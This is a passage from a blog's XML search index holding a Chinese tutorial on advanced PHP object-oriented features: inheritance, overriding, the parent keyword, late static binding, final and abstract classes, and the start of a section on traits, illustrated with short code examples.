<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php面向对象高级</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/2PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/2PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h4 id="转载自：黑马程序员武汉中心"><a href="#转载自：黑马程序员武汉中心" class="headerlink" title="转载自：黑马程序员武汉中心"></a>转载自：<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">黑马程序员武汉中心</a></h4><h1 id="面向对象高级"><a href="#面向对象高级" class="headerlink" title="面向对象高级"></a><strong>面向对象高级</strong></h1><blockquote><p>学习目标：了解面向对象的高级特性，掌握php中面向对象的高级语法和概念</p></blockquote><ul><li>面向对象三大特性</li><li>php继承</li><li>接口</li><li>php重载</li><li>trait代码复用</li><li>对象遍历</li></ul><h2 id="一、-面向对象三大特性"><a href="#一、-面向对象三大特性" class="headerlink" title="一、 面向对象三大特性"></a><strong>一、 面向对象三大特性</strong></h2><blockquote><p>目标：理解面向对象三大特性，了解每种特性带来的效果和价值</p></blockquote><ul><li>封装</li><li>继承</li><li>多态</li></ul><blockquote><p>概念</p></blockquote><p><strong>面向对象三大特性</strong>：面向对象是一种编程思想，其本质是以建立模型体现出来的<strong>抽象思维过程</strong>和<strong>面向对象的方法</strong>。模型是用来反映现实世界中事物特征的。</p><ul><li>面向对象编程思想三大特性：封装、继承、多态</li><li>三大特性是指导面向对象编程的核心思想</li></ul><blockquote><p>小结</p></blockquote><p>1、学习面向对象三大特性的目的是为了更好的理解面向对象编程思想</p><h3 id="1、封装"><a href="#1、封装" class="headerlink" title="1、封装"></a><strong>1、封装</strong></h3><blockquote><p>目标：理解封装的概念，掌握封装的核心理论，能够运用封装特性来支持面向对象编程</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>封装</strong>：字面意思就是将内容装到某个容器中，并进行密封保存。在面向对象思想中，封装指将<code>数据</code>和对<code>数据的操作</code>捆绑到一起，形成对外界的隐蔽，同时对外提供可以操作的<code>接口</code>。</p><ul><li><p>数据：即要操作的数据，在面向对象的具体体现就是类成员<strong>属性</strong>（属性和静态属性）和类常量，这些都是在类的内部定义的用来保存数据的</p></li><li><p>数据的操作：即数据加工过程，在面向对象的具体体现就是<strong>方法</strong>，内部定义业务逻辑对数据进行加工处理。</p></li><li><p>捆绑到一起：即使用类结构{}将属性、类常量和方法存放到一起，成为一个整体</p></li><li><p>对外提供可操作的接口：即提供可以供外部访问的类成员（通常是<strong>方法</strong>）</p></li></ul><blockquote><p>示例</p></blockquote><p>封装类并使用</p><pre><code># 封装特性class Saler{                # 捆绑内容到一起，形成对外界隐蔽的整体    const ALLOW = true;    private static $count = 0;    private $money = 0;         # 数据：属性和类常量保存    public function getMoney(){            # 数据操作        return $this-&gt;money;    }  }# 外部$s = new Saler();$s-&gt;getMoney();                # 外部只能访问类中公有的方法，具体实现不可见</code></pre><blockquote><p>小结</p></blockquote><p>1、封装是从对象实体抽象形成类的过程</p><p>2、封装的目的是让使用者只知道类能做什么，而不知道怎么做的</p><p>3、封装特性也明确了类与对象的职责：类负责处理业务逻辑，对象只要调用实现</p><h3 id="2、继承"><a href="#2、继承" class="headerlink" title="2、继承"></a><strong>2、继承</strong></h3><blockquote><p>目标：理解继承的概念，掌握继承架构带来的效果</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>继承</strong>：inherit，子类合法拥有父类某些权限</p><ul><li>继承必须满足继承关系：即存在合理的包含关系</li><li>继承的本质是子类通过继承可以直接使用父类已经存在的数据和数据操作</li><li>不同编程语言的继承机制和方式不一样，php中使用extends关键字表示继承</li></ul><blockquote><p>步骤</p></blockquote><p>1、创建父类：通常是比较抽象的，大概的类，定义的方法和属性也都是比较大众的</p><p>2、创建子类</p><ul><li>子类与已有父类之间属于包含关系：父类包含子类</li><li>子类创建时明确继承父类：extends</li></ul><p>3、实例化子类对象后，子类对象可以直接访问子类不存在而父类存在的属性和方法</p><blockquote><p>示例</p></blockquote><p>1、继承的基础：子类（要继承其他类的类，也称之为派生类）与父类（被继承类，也称之为基类）之间本身是一种包含于被包含关系，如此才有可继承的前提</p><pre><code># 大类class Human{}    # 人类# 小类class Man{}class Woman{}    # 属于人类包含的部分，可以继承Human</code></pre><p>2、继承关键字：extends，子类想要继承父类，则必须在子类结构申明时明确使用extends关键字来继承相关类</p><pre><code># 父类class Human{}    # 人类# 子类class Man extends Human{}class Woman extends Human{}    # 继承Human类</code></pre><p>3、继承效果：子类可以不用自己去实现某些功能，而可以直接访问父类中已经存在的成员</p><pre><code># 父类class Human{    public function eat(){        echo &apos;吃饭&apos;;    }}# 子类class Man extends Human{}            # 子类为空类：没有类成员# 实例化子类对象$m = new Man();$m-&gt;eat();                            # 输出吃饭</code></pre><blockquote><p>小结</p></blockquote><p>1、继承extends是面向对象思想中实现代码重复利用的重要特性</p><p>2、继承是指子类可以直接访问父类中已经存在的成员</p><p>3、继承可以节省代码工作，同时允许子类中进行扩展，即在子类中增加必要的父类不存在的功能</p><h3 id="3、多态"><a href="#3、多态" class="headerlink" title="3、多态"></a><strong>3、多态</strong></h3><blockquote><p>目标：了解多态的概念，理解多态的作用</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>多态</strong>：多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果</p><ul><li>需要发生<strong>类的继承</strong>，同时出现<strong>方法的重写（override）</strong>，即子类拥有与父类同名的方法</li><li>在实例化对象的时候让父类对象指向子类对象（强制类型，php不支持）</li><li>结果：父类对象表现的子类对象的特点</li></ul><blockquote><p>步骤</p></blockquote><p>1、明确继承关系：子类继承父类</p><p>2、子类重写父类方法</p><p>3、实例化子类，但是存储子类对象的数据类型为父类对象</p><p>4、实现：父类对象表现出子类对象的形态</p><blockquote><p>示例</p></blockquote><p>1、多态需要强类型语言，以Java为例</p><pre><code>// 父类class Animal{    public void show(){         System.out.println(&quot;Animal&quot;);    }}// 子类class Dog extends Animal{    // 重写show方法    public void show(){         System.out.println(&quot;Dog&quot;);    }}// 实例化：Java是强类型，必须指定保存数据的变量的类型Animal a = new Doc();     // 父类对象指向子类对象空间：a为父类形态a.show();                 // 打印Dog，父类对象调用的是子类方法：a表现出子类形态</code></pre><p>2、php是弱类型语言，所以不存在变量的强制类型，因此php不支持多态。但是php可以模拟多态</p><ul><li>多种子类继承父类</li><li>子类重写父类方法</li><li><p>父类定义方法实现统一重写方法调用</p><h1 id="父类"><a href="#父类" class="headerlink" title="父类"></a>父类</h1><p>class Animal{</p><pre><code># 统一调用被重写方法public static function show(Animal $obj){        # Animal $obj，强制对象为Animal对象（子类对象也可以）    # 对象动态调用方法    $obj-&gt;display();}# 父类方法public function display(){    echo &apos;Animal&apos;;}</code></pre><p>}</p><h1 id="子类1"><a href="#子类1" class="headerlink" title="子类1"></a>子类1</h1><p>class Cat extends Animal{</p><pre><code># 重写父类方法public function display(){    echo &apos;cat&apos;;}</code></pre><p>}</p><h1 id="子类2"><a href="#子类2" class="headerlink" title="子类2"></a>子类2</h1><p>class Dog extends Animal{</p><pre><code>public function display(){    echo &apos;dog&apos;;}</code></pre><p>}</p><h1 id="父类方法统一调用：传入不同的对象"><a href="#父类方法统一调用：传入不同的对象" class="headerlink" title="父类方法统一调用：传入不同的对象"></a>父类方法统一调用：传入不同的对象</h1><p>Animal::show(new Cat());        # 输出cat<br>Animal::show(new Dog());        # 输出dog</p></li></ul><blockquote><p>小结</p></blockquote><p>1、多态的发生必须是有继承关系，并且子类要重写父类方法</p><p>2、多态是指父类对象拥有子类形态，并且可以表现出子类的特性（调用子类方法）</p><p>3、php是弱类型语言，不支持多态</p><h2 id="二、-php继承"><a href="#二、-php继承" class="headerlink" title="二、 php继承"></a><strong>二、 php继承</strong></h2><blockquote><p>学习目标：掌握php中继承的实现，理解php继承中的诸多特性，能够使用继承来实现大型项目架构</p></blockquote><ul><li>继承语法</li><li>重写</li><li>parent关键字</li><li>php继承特点</li><li>静态延迟绑定</li><li>最终类</li><li>抽象类</li></ul><h3 id="1、继承相关概念和实现"><a href="#1、继承相关概念和实现" class="headerlink" title="1、继承相关概念和实现"></a><strong>1、继承相关概念和实现</strong></h3><blockquote><p>目标：了解php继承中相关的关键字，实现php中的继承</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>继承</strong>：extends，是指子类通过继承可以<strong>访问父类的成员</strong></p><ul><li>父类：也叫基类，是较大的分类</li><li>子类：也叫派生类，比父类的分类要小</li></ul><blockquote><p>步骤</p></blockquote><p>1、根据需求先抽象出父类</p><p>2、根据需求确定子类，并实现继承</p><blockquote><p>示例</p></blockquote><p>1、继承基本语法：class 子类 extends 父类{}</p><pre><code># 父类（基类）：人类是较大类，所有人都属于人类class Human{}# 子类（派生类）：小于人类，并且输入人类class Man extends Human{}</code></pre><p>2、继承效果：父类被继承的内容，可以通过子类对象进行访问（只能是子类对象）</p><pre><code># 父类（基类）class Human{    public function showName(){        echo __CLASS__;        # 代表当前所在类名    }}# 子类（派生类）class Man extends Human{}# 实例化子类对象：如果实例化父类对象Human，那么与子类和继承毫无关系$m = new Man();$m-&gt;showName();                # 访问继承自父类的方法：输出Human</code></pre><p>3、继承目标：继承本质是针对同类有包含关系的共性继承，即父类通常是包含子类，子类属于父类。所以在父类中通常定义的是子类共有的一些特性成员，这是开发者默认遵循的规则</p><pre><code>class Animal{}class Man extends Animal{}        # 不会有语法错误，也可以继承，但是不符合实际</code></pre><blockquote><p>小结</p></blockquote><p>1、继承是利用extends进行子类和父类的关联</p><p>2、继承利用extends关键字实现</p><p>3、继承是指实现继承关系后，子类对象可以访问父类被继承的成员。而父类对象（直接实例化父类得到）不可以访问子类成员（没有关系）</p><h3 id="2、有限继承"><a href="#2、有限继承" class="headerlink" title="2、有限继承"></a><strong>2、有限继承</strong></h3><blockquote><p>目标：理解php中继承的内容，掌握继承架构中的设计方案实现继承</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>有限继承</strong>：指子类在继承父类的成员的时候，并非继承所有内容，而是继承并使用父类部分内容</p><ul><li>php中继承的本质是对象继承</li><li>php中继承的内容：父类所有公有成员、受保护成员和私有属性，私有方法不能继承</li><li>受保护（protected）成员是专用于继承的，可以在父类或者子类内部访问</li><li>私有成员的访问只能在所属类中设定公有或者受保护方法实现访问</li><li>静态成员也遵循继承规则：即子类可以访问父类静态成员（满足继承条件下）</li></ul><blockquote><p>示例</p></blockquote><p>1、继承内容：php中继承是子类继承父类所有的公有成员、受保护成员和私有属性，不能继承父类的私有方法</p><pre><code># 父类class Human{    const CALL = &apos;人&apos;;    public $name = &apos;human&apos;;    protected $age = &apos;100&apos;;    private $money = &apos;100&apos;;    public function showName(){        echo $this-&gt;name;    }    protected function showAge(){        echo $this-&gt;age;    }    private function showMoney(){        echo $this-&gt;money;    }}# 子类class Man extends Human{}# 实例化子类$m = new Man();var_dump($m);                # 可以看到父类私有属性：说明被继承$m-&gt;showName();                # 允许直接访问：方法为公有允许类外访问</code></pre><p>2、受保护继承protected，protected关键字的产生本身就是纯用于继承的，表示允许被子类在子类内部访问的意思，而不允许被外部直接访问。</p><pre><code># 父类class Human{    protected $age = &apos;100&apos;;    protected function showAge(){        echo $this-&gt;age;    }}# 子类class Man extends Human{    # 在子类内部增加公有访问访问继承自父类的受保护成员    public function getProtected(){        echo $this-&gt;age;                # 访问父类受保护属性        $this-&gt;showAge();                # 访问父类受保护方法    }}# 实例化子类对象$m = new Man();$m-&gt;getProtected();                        # 正确输出：说明可以访问</code></pre><p>3、访问父类私有成员：子类若想访问父类私有成员，那么前提是父类提供了能够访问私有成员的接口：即提供了公有或者受保护的方法给子类访问</p><pre><code># 父类class Human{    private $age = 100;    private $money = 100;    # 提供接口供子类访问：此时通常是受保护的方法，肯定不允许外部直接访问的    protected function getAge(){        echo $this-&gt;age;    }}# 子类class Man extends Human{    # 依然需要定义方法来访问继承自父类的受保护的成员    public function showPrivate(){        $this-&gt;getAge();    }}# 实例化子类对象$m = new Man();$m-&gt;showPrivate();        # 输出100，表示正确访问</code></pre><p><strong>注意</strong>：虽然子类可以通过以上方式来实现访问父类的私有成员（包括私有方法），但是从设计的意义上讲，私有就是不允许外部访问，所以父类通常不会提供对外的访问接口，以上案例只是为了知识说明。</p><p>4、静态成员（类常量）也遵循继承规则（php继承本质是对象），只是访问方式是由类进行访问</p><pre><code>class Human{    const NAME = &apos;人&apos;;    public static $count = 0;    protected static $type = array(&apos;黑&apos;,&apos;黄&apos;,&apos;白&apos;);    public static function getCount(){        echo self::NAME;        echo self::$count;    }    protected static function getType(){        print_r(self::$type);    }}class Man extends Human{    # 依然需要子类中访问受保护成员    public static function getHuman(){        Human::getType();    }}echo Man::$count;    # 允许直接访问Man::getCount();    # 访问父类静态方法Man::getHuman();    # 利用子类公有方法访问父类受保护成员</code></pre><p>5、构造方法和析构方法也可以被子类继承，此时需要注意子类对象实例化时对应的父类构造方法的参数</p><pre><code># 父类class Human{    private $money;    public function __construct($money){        $this-&gt;money = $money;    }    public function __destruct(){        echo &apos;die&apos;;    }}# 子类继承class Man extends Human{}# 子类实例化：自身是空类，没有指定构造方法# $m = new Man();                    # 错误：缺少参数，因为会自动调用父类构造方法$m = new Man(100);                    # 正确</code></pre><blockquote><p>小结</p></blockquote><p>1、继承是有限继承，理论上是用来继承父类允许被继承的部分，即使用public或者protected修饰的成员（有限继承指的是有限能用而已）</p><p>2、因为对象的属性是保存在对象内存空间，所以父类的私有属性也会继承</p><p>3、父类私有成员本质不允许被子类访问，但是可以通过父类开放接口实现（一般不会这么操作）</p><p>4、静态成员也可以遵循继承规则</p><p>5、构造方法也可以被继承，因此在实例化子类对象的时候，要考虑到父类构造方法所使用到的参数问题</p><h3 id="3、重写Override"><a href="#3、重写Override" class="headerlink" title="3、重写Override"></a><strong>3、重写Override</strong></h3><blockquote><p>目标：理解重写的概念，掌握重写的意义</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>重写</strong>：override，子类中定义了与父类重名的成员</p><ul><li>子类可以重写父类任意类成员<ul><li>属性：直接覆盖，父类对象的属性将不存在（私有除外）</li><li>方法：同时存在</li></ul></li><li>通常重写是用来重写父类的方法，用于扩展或者更改某些业务逻辑</li><li>重写要求<ul><li>子类对于成员的控制权不能高于父类</li><li>子类重写方法时，参数要求与父类一致</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、存在继承关系</p><p>2、父类存在方法，但是不满足子类业务要求</p><p>3、子类重写父类方法（或者属性）</p><blockquote><p>示例</p></blockquote><p>1、子类继承父类，同时子类定义与父类同名的类成员</p><pre><code># 父类class Human{    public $name = &apos;Human&apos;;    public function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# 子类继承class Man extends Human{    # 定义同名属性    public $name = &apos;Man&apos;;    # 定义父类同名方法    public function show(){        echo __CLASS__,&apos; hello world&lt;br/&gt;&apos;;    }}</code></pre><p>2、重写父类成员之后，子类只会直接访问子类的成员（覆盖）</p><pre><code># 接上述代码# 实例化子类对象$m = new Man();$m-&gt;show();                # 输出Human hello worldvar_dump($m);            # 只有子类属性$name</code></pre><p><strong>注意</strong>：不管是公有和是受保护属性，一旦重写，父类的就会不存在，而私有属性不会被覆盖而丢失</p><p>3、重写的要求1：子类重写父类的方法，控制权不能高于父类，即子类可以比父类更开放</p><pre><code># 父类class Human{    protected function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# 子类继承class Man extends Human{    # 重写    protected function show(){}                # 正确    public function show(){}                # 允许    private function show(){}                # 错误：控制权比父类更严格  }</code></pre><p>4、重写的要求2：php中重写要求子类重写父类方法的时候，必须保证与父类同名方法参数一致</p><pre><code># 父类class Human{    protected function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# 子类继承class Man extends Human{    # 重写    public function show(){}    public function show($a){}            # 错误，与父类同名方法不一致}</code></pre><p><strong>注意</strong>：在方法参数一致不单单要求数量一致，而且数据类型要求也必须相同，但形参名字可以不同；另外，在php7以前重写对于参数这块没有要求。</p><p>5、重写的要求3：重写针对的是被继承的成员，父类私有方法不会被继承，因此不受要求2规定</p><pre><code># 父类class Human{    private function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# 子类class Man extends Human{    private function show($name){        # 不会报错，因为本质不存在重写（父类Human::show没有被继承）        echo $name,&apos;&lt;br/&gt;&apos;;    }}</code></pre><blockquote><p>小结</p></blockquote><p>1、重写override是一种在子类中定义父类同名成员的操作</p><p>2、公有、受保护的属性重写是直接覆盖父类成员，私有属性不会被覆盖；公有、收保护的方法会被重写，但是私有方法不会被重写（私有方法本质没有被继承）</p><p>3、重写的要求</p><ul><li>子类控制权不能高于父类控制权</li><li>php7中要求被重写的方法必须与父类保持参数一致（数量和类型）</li><li>私有方法不能继承，因此不存在重写</li></ul><p>4、静态成员也可以被重写，但是静态属性不会被覆盖（属于类，不属于对象）</p><h3 id="4、parent关键字"><a href="#4、parent关键字" class="headerlink" title="4、parent关键字"></a>4、parent关键字</h3><blockquote><p>目标：理解重写后的访问原理，使用parent实现被重写后的父类成员访问</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>parent关键字</strong>：一种明确访问父类成员的表达方式</p><ul><li>parent关键字是用于在被重写的方法（子类）中明确访问父类被重写成员</li><li>parent可以访问父类静态属性、静态方法、类常量和普通方法</li><li><p>parent使用范围解析操作符访问</p><p>parent::父类方法()</p></li></ul><blockquote><p>步骤</p></blockquote><p>1、子类继承父类</p><p>2、子类重写父类方法</p><p>3、子类重写的方法内部需要访问父类成员或者明确需要访问父类成员</p><p>4、使用parent访问父类方法</p><blockquote><p>示例</p></blockquote><p>1、父类为数据库初始化类，子类为针对表的业务类：子类继承父类，但是子类也有资源要初始化，需要重写父类构造方法：但是又需要父类的构造方法执行以实现数据库的初始化操作</p><pre><code>class DB{    protected $link;    public function __construct(){        $this-&gt;link = mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;,&apos;db_2&apos;,&apos;3306&apos;) or die(&apos;数据库连接失败！&apos;);        echo __METHOD__;    }}class Table extends DB{    # 重写父类方法    public function __construct(){        # 让父类构造方法先执行        parent::__construct();        # 执行其他        echo __METHOD__;    }}# 实例化$t = new Table();        # 输出DB::__construct Table::__construct</code></pre><p>2、静态属性重写后，需要在子类中进行访问</p><pre><code>class Father{    public static $count = 1;}class Son extends Father{    # 重写    public static $count = 2;    public static function getCount(){        echo self::$count + parent::$count;    }}# 调用Son::getCount();</code></pre><blockquote><p>小结</p></blockquote><p>1、方法被重写后，访问调用的都是子类方法，如果想要访问父类方法，可以通过在子类方法中使用parent关键字来强制访问父类方法</p><p>2、parent不能用于访问父类的属性（静态属性可以）</p><h3 id="5、php继承特点"><a href="#5、php继承特点" class="headerlink" title="5、php继承特点"></a><strong>5、php继承特点</strong></h3><blockquote><p>目标：了解php继承的特性，避免在使用继承过程中出现问题</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>php继承特点</strong>：与其他纯面向对象（从设计之初就完全由面向对象思维支配）编程语言是有一些不一样</p><ul><li>php只能单继承，只有一个父类</li><li>php继承中，只有私有方法不能继承</li><li>php允许继承父类中的构造方法和析构方法</li></ul><blockquote><p>示例</p></blockquote><p>1、php中继承只能单继承：即子类只有一个父类（有些语言支持多继承）</p><pre><code>class Man{}class Woman{}class Ladyboy extends Man,Woman{}    # php中错误，不允许继承多个父类</code></pre><p>2、php若想继承多个类，可以使用链式继承</p><pre><code>class Man{}class Woman extends Man{}class Ladyboy extends Woman{}        # Ladyboy包含了Man和Woman类中所有可继承的成员</code></pre><blockquote><p>小结</p></blockquote><p>1、php中的继承与传统的面向对象继承有着一些小区别，大家在使用继承的时候要严格遵守php的继承规则</p><h3 id="6、静态延迟绑定"><a href="#6、静态延迟绑定" class="headerlink" title="6、静态延迟绑定"></a><strong>6、静态延迟绑定</strong></h3><blockquote><p>目标：了解静态延迟绑定的原理，掌握静态延迟绑定的应用</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>静态延迟绑定</strong>：static，即在类内部用来代表类本身的关键字部分不是在类编译时固定好，而是当方法被访问时动态的选择来访者所属的类</p><ul><li>静态延迟绑定就是利用<code>static</code>关键字代替静态绑定self（静态绑定），静态延迟绑定需要使用到静态成员的重写</li><li>静态延迟绑定是为了明确访问的主体：类</li></ul><blockquote><p>步骤</p></blockquote><p>1、要访问的内容为静态成员（或者类常量）</p><p>2、需要动态确定访问者而不是固定死</p><p>3、使用静态延迟绑定</p><blockquote><p>示例</p></blockquote><p>1、静态延迟绑定：使用static关键字代替self进行类成员访问</p><pre><code># 父类class Human{    public static $name = &apos;Human&apos;;    public static function showName(){        # 静态绑定        echo self::$name,&apos;&lt;br/&gt;&apos;;        # 静态延迟绑定        echo static::$name,&apos;&lt;br/&gt;&apos;;    }}Human::showName();                    # 输出Human和Human（此时没子类的事儿）</code></pre><p>2、静态延迟绑定一定是通过继承后的子类来进行访问才有效果</p><pre><code># 子类class Man extends Human{    # 重写父类静态属性    public static $name = &apos;Man&apos;;    # 静态属性因为存储在类内部，因此不会覆盖}# 子类访问Man::showName();                    # 输出Human和Man</code></pre><blockquote><p>原理</p></blockquote><p>self</p><p>static</p><p>代码开始</p><p>编译代码</p><p>静态绑定or静态延迟绑定</p><p>静态绑定<br>self = 当前类名</p><p>静态延迟绑定<br>static = 未知类名</p><p>执行代码<br>self明确访问类名<br>static看具体谁调用</p><p>结束</p><blockquote><p>小结</p></blockquote><p>1、静态延迟绑定是指通过static关键字进行类静态成员的访问，是指在被访问时才决定到底使用哪个类</p><p>2、静态延迟绑定对比的是静态绑定self</p><p>3、静态延迟绑定的意义是用来保证访问的静态成员是根据调用类的不同而选择不同的表现</p><h3 id="7、最终类Final"><a href="#7、最终类Final" class="headerlink" title="7、最终类Final"></a><strong>7、最终类Final</strong></h3><blockquote><p>目标：了解最终类的概念，掌握final关键字的作用和实际应用场景</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>最终类</strong>：使用final关键字修饰类名，表示此类不可以被继承</p><ul><li><p>最终类表示类已经到头，不允许再作为其他类的父类被继承</p></li><li><p>最终类只能直接实例化使用</p></li><li><p>final除了修饰类之外，还能修饰方法，表示方法不可被重写</p></li><li><p>final修饰的不管是类还是方法，都是为了保护结构不被恶意扩展或者修改</p></li></ul><blockquote><p>示例</p></blockquote><p>1、基本语法：final class 类名</p><pre><code># 最终类final class Man{}</code></pre><p>2、最终类无法被继承</p><pre><code># 最终类final class Man{}class Man18 extends Man{}        # 致命错误：无法从final类继承</code></pre><p>3、final关键字不止修饰类表示类不可被继承，还能修饰方法，表示方法不能被重写</p><pre><code># 父类class Human{    public function show(){}        # 普通方法    public final function walk(){}    # 最终方法}# 子类class Man extends Human{    # 重写    public function show(){}        # 没问题    public function walk(){}        # 致命错误：不能重写父类中的最终方法}</code></pre><blockquote><p>小结</p></blockquote><p>1、final关键字修饰的类表示无法被继承</p><p>2、final关键字还可以修饰方法，表示方法不能子类重写（通常类不会使用final关键字）</p><p>3、final修饰类表示不希望类再出现子类，可以很好保护类的内部结构不被暴露（可以有效控制继承链）</p><p>4、final修饰方法表示不希望方法被修改，可以在一个更高的维度来保证同类事务的共同表现</p><h3 id="8、抽象类Abstract"><a href="#8、抽象类Abstract" class="headerlink" title="8、抽象类Abstract"></a><strong>8、抽象类Abstract</strong></h3><blockquote><p>目标：理解抽象类的概念，掌握abstract关键字的作用和实际应用场景，理解大型项目架构的优缺点</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>抽象类</strong>：使用abstract关键字修饰的类，表示该类只能被继承，不能被实例化</p><ul><li>抽象类只是用来规范下属类的基本结构，本身不可被实例化</li><li>抽象类只能被实现类继承</li><li>abstract关键字可以修饰方法，表示方法为抽象方法，抽象方法没有方法体（没有{}）<ul><li>抽象方法存在的类必须为抽象类</li><li>继承抽象类的类要么为抽象类，要么实现抽象类里所有的抽象方法</li></ul></li><li>抽象类还可以有其他类该有的任何成员</li></ul><blockquote><p>步骤</p></blockquote><p>1、项目较大，分组完成</p><p>2、项目管理者为了确保各组开发的统一性，规范上层架构</p><p>3、使用抽象类和抽象方法设定基调（多种抽象类）</p><p>4、所有实现类都继承抽象类</p><blockquote><p>示例</p></blockquote><p>1、基本语法：使用abstract关键字修饰类</p><pre><code># 抽象类abstract class Human{}</code></pre><p>2、抽象类无法被实例化</p><pre><code># 抽象类abstract class Human{}$h = new Human();                # 致命错误，抽象类不能被实例化</code></pre><p>3、抽象类只能被继承</p><pre><code># 抽象类（父类）abstract class Human{}# 子类class Man extends Human{}        # 正确</code></pre><p>4、abstract关键字还可以用来修饰方法（抽象方法），abstract修饰的方法不能有方法体，而且有抽象方法的类必须声明为抽象类</p><pre><code># 抽象方法抽象类abstract class Human{    # 定义抽象方法：没有方法体    abstract public function eat();    public function show(){}            # 普通方法有方法体}</code></pre><p>5、抽象方法因为要被子类继承实现，所以不能使用private修饰（私有方法不会被继承）</p><pre><code># 抽象类abstract class Human{    # 抽象方法    abstract private function eat();        # 错误：抽象方法不能私有化}</code></pre><p>6、子类继承抽象类后，如果抽象类中有抽象方法，那么子类必须选择自己成为抽象类或者实现抽象方法（所有抽象方法）</p><pre><code># 抽象方法抽象类(父类)abstract class Human{    # 定义抽象方法：没有方法体    abstract public function eat();    public function show(){}            # 普通方法有方法体}# 子类1：抽象类继承抽象类abstract class Man extends Human{}        # 正常继承# 子类2：子类实现父类所有抽象方法class Boy extends Man{    # 实现从祖父类继承的eat抽象方法    public function eat(){        echo &apos;eat&apos;;    }}</code></pre><blockquote><p>小结</p></blockquote><p>1、使用abstract修饰的类叫做抽象类</p><p>2、抽象类不可以被实例化，只能被继承</p><p>3、因为抽象类无法被实例化，因此私有成员在类中没有实质意义（还需要额外提供受保护或者<strong>公有</strong>方法来实现访问）</p><p>4、抽象类的目的是用来规范子类（通常比配抽象方法）</p><p>5、abstract还可以修饰方法，称之为抽象方法：抽象方法所在的类必须是抽象类，抽象方法不能有方法体</p><p>6、有抽象方法的抽象被继承时子类要么自身是抽象类，要么实现所有抽象方法</p><p>7、抽象类这种结构管理，需要耗费较多的架构和初始代码，通常在比较大型或者规范的项目中才会使用</p><h3 id="9、总结"><a href="#9、总结" class="headerlink" title="9、总结"></a>9、总结</h3><p>1、继承是面向对象思想中实现代码复用最重要的一种机制</p><ul><li>相关类进行继承</li><li>共性内容形成父类（再共性形成更高级父类）</li><li>继承的存在会导致效率的降低：但是基于当前计算机的运算能力，这些效率降低将不足为道</li></ul><p>2、继承允许共用的前提下也允许子类根据自己的需求进行相应修改</p><ul><li>重写可以实现子类业务的扩展</li><li>parent关键字允许子类在重写基础上继续保留父类提供的服务</li><li>允许子类扩展业务</li></ul><p>3、php有自己独特的继承特点</p><ul><li>单继承</li><li>链式继承</li></ul><p>4、继承过程中self关键字是静态绑定当前类名，而static可以延迟绑定（动态绑定访问类名）</p><p>5、高级类限定</p><ul><li>最终类：限制类被继承，从而保护结构（final修饰方法保护方法不被重写）</li><li>抽象类：规范类结构，从而保证开发一致性（abstract修饰方法保障子类必须实现相应方法）</li></ul><h2 id="三、trait代码复用"><a href="#三、trait代码复用" class="headerlink" title="三、trait代码复用"></a>三、trait代码复用</h2><blockquote><p>学习目标：理解trait代码复用的作用，掌握trait的应用场景和实际运用</p></blockquote><ul><li>trait概念</li><li>trait同名</li><li>trait别名</li><li>trait控制权</li><li>trait优先级</li></ul><h3 id="1、trait概念"><a href="#1、trait概念" class="headerlink" title="1、trait概念"></a>1、trait概念</h3><blockquote><p>目标：了解trait概念和作用，掌握具体的使用方式</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>Trait</strong>： 为类似 php 的单继承语言而准备的一种代码复用机制</p><ul><li>trait可以使得单继承语言摆脱为了复用而不得不继承的尴尬，让面向对象变得更加纯粹<ul><li>类的继承应该本身类之间具有相似性（包含）</li><li>有些不同类型的类却拥有公共的方法<ul><li>为了实现代码复用就要增加公共类，然后继承（为了继承而继承，不纯粹符合面向对象）</li><li>提供公共代码让具有共性类引入（trait）</li></ul></li></ul></li><li><p>trait的结构类似于类：可以有属性和方法，但不能有常量</p><p>trait 名字{</p><pre><code># 属性（包含静态）# 方法（包含静态、抽象方法）</code></pre><p>}</p></li><li><p>trait是为类提供公共内容的，因此是需要在类中引入trait，从而实现公共内容的使用</p><p>class 类名{</p><pre><code># 引入trait即可使用trait里定义的内容use trait名字;</code></pre><p>}</p></li><li><p>一个类可以使用多个trait</p><p>class 类名{</p><pre><code># 引入trait即可使用trait里定义的内容use trait名字1,trait名字2...;</code></pre><p>}</p></li></ul><blockquote><p>步骤</p></blockquote><p>1、不同类之间有公共代码，但是类彼此关系不存在继承关系</p><p>2、将公共代码抽离出来存储到trait中</p><p>3、在需要使用的类中引入trait，实现公共代码复用</p><p>4、如果存在抽象方法，那么引入的类要么是抽象类，要么要实现抽象方法</p><blockquote><p>示例</p></blockquote><p>1、创建trait</p><pre><code>trait Eat{}</code></pre><p>2、trait内部可以拥有一个类能拥有成员属性（包含静态），成员方法（包含静态和抽象方法），但不能有类常量</p><pre><code>trait Eat{    public $time;    protected $how;                        private $info;    public function showTime(){        echo $this-&gt;time;    }    protected function showHow(){            echo $this-&gt;how;    }    abstract public function abstractMethod();    const PI = 3.14;                # 错误：trait中不能有常量}</code></pre><p>3、trait是用来实现代码的复用的，不可以被实例化也不可以被继承（不是类）</p><pre><code>trait Eat{}new Eat();            # 